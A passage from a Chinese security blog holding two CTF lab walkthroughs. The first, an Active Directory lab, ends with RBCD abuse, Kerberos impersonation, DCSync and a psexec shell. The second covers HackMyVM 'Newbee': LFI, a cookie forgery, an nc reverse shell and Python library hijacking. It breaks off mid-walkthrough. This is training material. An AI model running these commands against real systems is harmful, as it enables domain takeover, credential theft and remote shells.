<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# certipy-ad cert -pfx xr-dc01.pfx &gt; xr-dc01.pem</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# bloodyAD -d xiaorang.lab -u &#x27;EVILCOMPUTER2 $&#x27; -c &#x27;:xr-dc01.pem&#x27; --host 172.22.15.13 --secure add rbcd &#x27;xr-dc01$&#x27; &#x27;EVILCOMPUTER2$&#x27;</span><br><span class="line">[!] No security descriptor has been returned, a new one will be created</span><br><span class="line">[+] EVILCOMPUTER2 $ can now impersonate users on xr-dc01$ via S4U2Proxy</span><br></pre></td></tr></table></figure>

<p>请求并冒充域管权限的服务票据：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# impacket-getST &#x27;xiaorang.lab/EVILCOMPUTER2$: 123@#ABC&#x27; -spn LDAP/xr-dc01.xiaorang.lab -impersonate Administrator</span><br><span class="line"> -dc-ip 172.22.15.13</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">[*] Getting TGT for user</span><br><span class="line">[*] Impersonating Administrator</span><br><span class="line">/usr/share/doc/python3-impacket/examples/getST.py: 380: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).</span><br><span class="line">  now = datetime.datetime.utcnow()</span><br><span class="line">/usr/share/doc/python3-impacket/examples/getST.py: 477: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).</span><br><span class="line">  now = datetime.datetime.utcnow() + datetime.timedelta(days = 1)</span><br><span class="line">[*] Requesting S4U2self</span><br><span class="line">/usr/share/doc/python3-impacket/examples/getST.py: 607: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).</span><br><span class="line">  now = datetime.datetime.utcnow()</span><br><span class="line">/usr/share/doc/python3-impacket/examples/getST.py: 659: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).</span><br><span class="line">  now = datetime.datetime.utcnow() + datetime.timedelta(days = 1)</span><br><span class="line">[*] Requesting S4U2Proxy</span><br><span class="line">[*] Saving ticket in Administrator@LDAP_xr-dc01.xiaorang.lab@XIAORANG.LAB.ccache</span><br><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# export KRB5CCNAME = Administrator@LDAP_xr-dc01.xiaorang.lab@XIAORANG.LAB.ccache</span><br><span class="line"></span><br><span class="line">DCSync 从域控导出凭据：</span><br><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# impacket-secretsdump &#x27;xiaorang.lab/administrator@XR-DC01.xiaorang.lab&#x27; -target-ip 172.22.15.13 -no-pass -k -just-dc-user Administrator</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">[*] Dumping Domain Credentials (domain\uid: rid: lmhash: nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">[-] &#x27;NoneType&#x27; object has no attribute &#x27;getRemoteHost&#x27;</span><br><span class="line">[*] Something went wrong with the DRSUAPI approach. Try again with -use-vss parameter</span><br><span class="line">[*] Cleaning up...</span><br><span class="line"></span><br><span class="line">PTH 登录域控：</span><br><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# impacket-psexec &#x27;xiaorang.lab/administrator@XR-DC01.xiaorang.lab&#x27; -target-ip 172.22.15.13 -codec gbk -no-pass -k</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">[*] Requesting shares on 172.22.15.13.....</span><br><span class="line">[*] Found writable share ADMIN$</span><br><span class="line">[*] Uploading file FavsxEaA.exe</span><br><span class="line">[*] Opening SVCManager on 172.22.15.13.....</span><br><span class="line">[*] Creating service fjnA on 172.22.15.13.....</span><br><span class="line">[*] Starting service fjnA.....</span><br><span class="line">[!] Press help for extra shell commands</span><br><span class="line">Microsoft Windows [版本 10.0.14393]</span><br><span class="line">(c) 2016 Microsoft Corporation。保留所有权利。</span><br><span class="line"></span><br><span class="line">C:\windows\system32 &gt; </span><br></pre></td></tr></table></figure>

<p>flag 在 C:\Users\Administrator\flag 下</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://h0ny.github.io/posts/2022%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%9B%98-%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/#as-rep-roasting">https://h0ny.github.io/posts/2022%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%9B%98-%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/#as-rep-roasting</a></p>
<p><a target="_blank" rel="noopener" href="https://x1nri.github.io/2025/01/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3/">https://x1nri.github.io/2025/01/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3/</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://lvzhouhang.xyz/2025/03/26/Hackmyvm-Newbee/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="lvzhouhang">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="lvzhouhang">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/03/26/Hackmyvm-Newbee/" class="post-title-link" itemprop="url">Hackmyvm-Newbee</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2025-03-26 20:10:10 / 修改时间：20:55:36" itemprop="dateCreated datePublished" datetime="2025-03-26T20:10:10+08:00">2025-03-26</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/HackMyVM/" itemprop="url" rel="index"><span itemprop="name">HackMyVM</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="fa fa-file-word-o"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>14k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="fa fa-clock-o"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>13 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><p>arp-scan -l</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129</span><br><span class="line">Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.31.1    0a:00:27:00:00:11       (Unknown: locally administered)</span><br><span class="line">192.168.31.2    08:00:27:f5:b9:af       PCS Systemtechnik GmbH</span><br><span class="line">192.168.31.122  00:0c:29:71:20:21       VMware, Inc.</span><br><span class="line"></span><br><span class="line">3 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.10.0: 256 hosts scanned in 2.384 seconds (107.38 hosts/sec). 3 responded</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>192.168.31.122就是ip地址</p>
<p>nmap 192.168.31.122 -p-扫描端口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# nmap 192.168.31.122 -p-</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-26 08:21 EDT</span><br><span class="line">Nmap scan report for 192.168.31.122</span><br><span class="line">Host is up (0.00090s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 00:0C:29:71:20:21 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 6.71 seconds</span><br></pre></td></tr></table></figure>

<h1 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h1><p>查看页面源码，在最下面可以发现有一个</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--Wrong paramter to GET--&gt;</span><br></pre></td></tr></table></figure>

<p>对get参数进行fuzz</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -u &quot;http://192.168.31.122?FUZZ=/etc/passwd&quot; --hh 18851</span><br><span class="line"> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#x27;s documentation for more information.</span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 3.1.0 - The Web Fuzzer                         *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: http://192.168.31.122?FUZZ=/etc/passwd/</span><br><span class="line">Total requests: 220559</span><br><span class="line"></span><br><span class="line">=====================================================================</span><br><span class="line">ID           Response   Lines    Word       Chars       Payload</span><br><span class="line">=====================================================================</span><br><span class="line"></span><br><span class="line">000001799:   200        376 L    1270 W     18863 Ch    &quot;hack&quot;</span><br></pre></td></tr></table></figure>

<p>能fuzz出来参数名为hack，但是页面最下方还是会报错</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- include failed try another file --&gt;</span><br></pre></td></tr></table></figure>

<p>尝试包含其他文件</p>
<p>扫描目录可以扫描到一个secret.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# gobuster dir -u &quot;http://192.168.31.122/&quot; -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-m</span><br><span class="line">edium.txt -x .php,.txt</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.6</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.31.122/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.6</span><br><span class="line">[+] Extensions:              php,txt</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/.php                 (Status: 403) [Size: 279]</span><br><span class="line">/index.php            (Status: 200) [Size: 18852]</span><br><span class="line">/contact.php          (Status: 200) [Size: 8853]</span><br><span class="line">/about.php            (Status: 200) [Size: 10036]</span><br><span class="line">/blog.php             (Status: 200) [Size: 9782]</span><br><span class="line">/products.php         (Status: 200) [Size: 12163]</span><br><span class="line">/terms.php            (Status: 200) [Size: 6670]</span><br><span class="line">/assets               (Status: 301) [Size: 317] [--&gt; http://192.168.31.122/assets/]</span><br><span class="line">/testimonials.php     (Status: 200) [Size: 7907]</span><br><span class="line">/javascript           (Status: 301) [Size: 321] [--&gt; http://192.168.31.122/javascript/]</span><br><span class="line">/checkout.php         (Status: 200) [Size: 13307]</span><br><span class="line">/secret.php           (Status: 200) [Size: 2187]</span><br><span class="line">/.php                 (Status: 403) [Size: 279]</span><br><span class="line">/server-status        (Status: 403) [Size: 279]</span><br></pre></td></tr></table></figure>

<p>secret.php可以执行命令，但是必须要先进行身份验证，用lfi包含secret.php试试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.31.122/?hack=php://filter/convert.base64-encode/resource=secret.php</span><br></pre></td></tr></table></figure>

<p>可以包含出来</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">#secret.php</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;zh-CN&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;命令行控制台&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        body &#123;</span><br><span class="line">            background-color: #1e1e1e;</span><br><span class="line">            font-family: Consolas, monospace;</span><br><span class="line">            color: #fff;</span><br><span class="line">            margin: 0;</span><br><span class="line">            padding: 0;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .console &#123;</span><br><span class="line">            width: 80%;</span><br><span class="line">            margin: 50px auto;</span><br><span class="line">            padding: 20px;</span><br><span class="line">            background-color: #000;</span><br><span class="line">            border-radius: 8px;</span><br><span class="line">            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);</span><br><span class="line">            height: 400px;</span><br><span class="line">            overflow-y: auto;</span><br><span class="line">            font-size: 16px;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .output &#123;</span><br><span class="line">            white-space: pre-wrap;</span><br><span class="line">            margin-bottom: 10px;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .input-container &#123;</span><br><span class="line">            display: flex;</span><br><span class="line">            align-items: center;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .input-container .prompt &#123;</span><br><span class="line">            color: #00ff00;</span><br><span class="line">            margin-right: 5px;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .input-container input &#123;</span><br><span class="line">            background: transparent;</span><br><span class="line">            border: none;</span><br><span class="line">            color: #fff;</span><br><span class="line">            width: 100%;</span><br><span class="line">            padding: 5px;</span><br><span class="line">            font-size: 16px;</span><br><span class="line">            outline: none;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .input-container input:focus &#123;</span><br><span class="line">            border: 1px solid #00ff00;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .input-container input::placeholder &#123;</span><br><span class="line">            color: #888;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .console-footer &#123;</span><br><span class="line">            padding-top: 10px;</span><br><span class="line">            color: #888;</span><br><span class="line">            font-size: 12px;</span><br><span class="line">            text-align: center;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class=&quot;console&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;output&quot; id=&quot;output&quot;&gt;</span><br><span class="line">        &lt;?php</span><br><span class="line"></span><br><span class="line">        if (isset($_COOKIE[&#x27;AreYouAdmin&#x27;]) &amp;&amp; $_COOKIE[&#x27;AreYouAdmin&#x27;] === &#x27;Yes&#x27;) &#123;</span><br><span class="line"></span><br><span class="line">            if (isset($_GET[&#x27;command&#x27;])) &#123;</span><br><span class="line">                $command = $_GET[&#x27;command&#x27;];</span><br><span class="line">                $output = shell_exec($command);</span><br><span class="line">                echo &#x27;&lt;div&gt;\&gt; &#x27; . htmlspecialchars($command) . &#x27;&lt;/div&gt;&#x27;;</span><br><span class="line">                echo &#x27;&lt;div&gt;&#x27; . nl2br(htmlspecialchars($output)) . &#x27;&lt;/div&gt;&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &#x27;&lt;div&gt;No permission to execute commands, lacking admin permission.&lt;/div&gt;&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">        ?&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div class=&quot;input-container&quot;&gt;</span><br><span class="line">        &lt;span class=&quot;prompt&quot;&gt;\&gt;&lt;/span&gt;</span><br><span class="line">        &lt;form method=&quot;get&quot;&gt;</span><br><span class="line">            &lt;input type=&quot;text&quot; name=&quot;command&quot; id=&quot;input&quot; placeholder=&quot;command...&quot; autocomplete=&quot;off&quot;&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    const inputField = document.getElementById(&quot;input&quot;);</span><br><span class="line"></span><br><span class="line">    inputField.focus();</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>伪造cookie</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: AreYouAdmin=yes</span><br></pre></td></tr></table></figure>

<p>然后反弹shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/bash 192.168.31.129 4444</span><br><span class="line">script -qc /bin/bash /dev/null #获得交互式shell</span><br></pre></td></tr></table></figure>

<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">www-data@Newbee:/var/www/html/shop$ sudo -l</span><br><span class="line">sudo: unable to resolve host Newbee: Temporary failure in name resolution</span><br><span class="line">Matching Defaults entries for www-data on Newbee:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,</span><br><span class="line">    targetpw, use_pty</span><br><span class="line"></span><br><span class="line">User www-data may run the following commands on Newbee:</span><br><span class="line">    (debian) NOPASSWD: /usr/bin/python3 /var/www/html/vuln.py</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">#vuln.py</span><br><span class="line">import random</span><br><span class="line">import time</span><br><span class="line">import math</span><br><span class="line">import string</span><br><span class="line">import datetime</span><br><span class="line"></span><br><span class="line">def generate_random_string(length=10):</span><br><span class="line"></span><br><span class="line">    return &#x27;&#x27;.join(random.choices(string.ascii_letters + string.digits, k=length))</span><br><span class="line"></span><br><span class="line">def pointless_computation():</span><br><span class="line"></span><br><span class="line">    number = random.randint(1, 1000)</span><br><span class="line">    result = math.sqrt(number) * math.log(number)</span><br><span class="line">    print(f&quot;Calculated math nonsense: sqrt(&#123;number&#125;) * log(&#123;number&#125;) = &#123;result&#125;&quot;)</span><br><span class="line"></span><br><span class="line">def simulate_time_wasting():</span><br><span class="line"></span><br><span class="line">    now = datetime.datetime.now()</span><br><span class="line">    print(f&quot;Started wasting time at &#123;now&#125;&quot;)</span><br><span class="line">    time.sleep(2)  # 故意睡眠 2 秒</span><br><span class="line">    later = datetime.datetime.now()</span><br><span class="line">    print(f&quot;Finished wasting time at &#123;later&#125;. Time wasted: &#123;later - now&#125;&quot;)</span><br><span class="line"></span><br><span class="line">def pointless_string_operations():</span><br><span class="line"></span><br><span class="line">    rand_str = generate_random_string()</span><br><span class="line">    print(f&quot;Generated random string: &#123;rand_str&#125;&quot;)</span><br><span class="line">    reversed_str = rand_str[::-1]</span><br><span class="line">    print(f&quot;Reversed string: &#123;reversed_str&#125;&quot;)</span><br><span class="line">    print(f&quot;String length: &#123;len(rand_str)&#125;&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    pointless_computation()</span><br><span class="line">    simulate_time_wasting()</span><br><span class="line">    pointless_string_operations()</span><br><span class="line">    print(&quot;All done. The script accomplished nothing useful.&quot;)</span><br></pre></td></tr></table></figure>

<p>可以在/var/www/html目录下创建一个random.py文件进行劫持，python文件会优先加载当前目录下的库</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#random.py</span><br><span class="line">import os</span><br><span class="line">os.system(&quot;bash -p&quot;)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www-data@Newbee:/var/www/html$ sudo -u debian /usr/bin/python3 /var/www/html/vuln.py</span><br><span class="line">debian@Newbee:/var/www/html$</span><br></pre></td></tr></table></figure>

<p>提到debian用户了，home目录下有一个note.txt和一个config.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">debian@Newbee:~$ cat note.txt</span><br><span class="line">Damn it, I forgot my database password. I heard that Debian is currently building a message board, maybe he can help me</span><br></pre></td></tr></table></figure>

